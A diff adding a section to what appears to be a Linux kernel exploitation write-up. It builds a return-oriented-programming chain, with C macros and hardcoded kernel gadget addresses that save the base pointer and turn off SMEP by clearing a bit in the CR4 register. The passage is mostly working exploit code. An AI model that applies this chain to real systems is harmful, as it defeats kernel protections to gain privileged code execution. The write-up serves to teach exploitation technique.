@@ -717,5 +717,56 @@ retry:
 }
 ```
 
+Now we need to buid rop chain. We start with saving rsp and rbp. It would be much easier if we have used a xchg rsp, rcx or xchg esp, rcx gadget to pivot the stack, but I couldn't find any. We will save just rbp as we saw before that offset between rsp and rbp is equal to 0xb0 (look at registers values above, rsp=0xffff880000a53de8, rbp=0xffff880000a53e98).
+
+I found such gadgets to save rbp:
+
+```c
+#define POP_RCX ((uint64_t)0xffffffff8100700c)
+#define MOV_DWORDPTR_RCX_EAX ((uint64_t)0xffffffff81004d05)
+#define XCHG_RBP_RAX ((uint64_t)0xffffffff81446980)
+#define SHR_RAX_32 ((uint64_t)0xffffffff81216ede)
+
+#define STORE_EAX(addr)        \
+    *stack++ = POP_RCX;        \
+    *stack++ = (uint64_t)addr; \
+    *stack++ = MOV_DWORDPTR_RCX_EAX;
+
+#define SAVE_RBP(addr_hi, addr_lo) \
+    *stack++ = XCHG_RBP_RAX;       \
+    STORE_EAX(addr_lo);            \
+    *stack++ = SHR_RAX_32;         \
+    STORE_EAX(addr_hi);
+```
+
+and such to disable smep:
+
+```c
+#define SMEP_MASK (~((uint64_t)(1 << 20)))
+
+#define MOV_CR4_RDI ((uint64_t)0xffffffff81004d80)
+#define MOV_RAX_CR4 ((uint64_t)0xffffffff81004c14)
+#define POP_RSI ((uint64_t)0xffffffff812c6c4e)
+#define AND_RAX_RSI ((uint64_t)0xffffffff815df7f6)
+#define MOV_RDI_RAX ((uint64_t)0xffffffff8133b32e)
+
+#define DISABLE_SMEP()             \
+    *stack++ = MOV_RAX_CR4;        \
+    *stack++ = 0x4141414141414141; \
+    *stack++ = POP_RSI;            \
+    *stack++ = SMEP_MASK;          \
+    *stack++ = AND_RAX_RSI;        \
+    *stack++ = 0x4141414141414141; \
+    *stack++ = MOV_RDI_RAX;        \
+    *stack++ = 0x4141414141414141; \
+    *stack++ = 0x4141414141414141; \
+    *stack++ = MOV_CR4_RDI;        \
+    *stack++ = 0x4141414141414141;
+```
+
+To disable smep we had to disable smep flag in CR4 register (20th bit).
+
+Now we can jump to assembly 
+
 ## References:
 - https://blog.csdn.net/lukuen/article/details/6935068
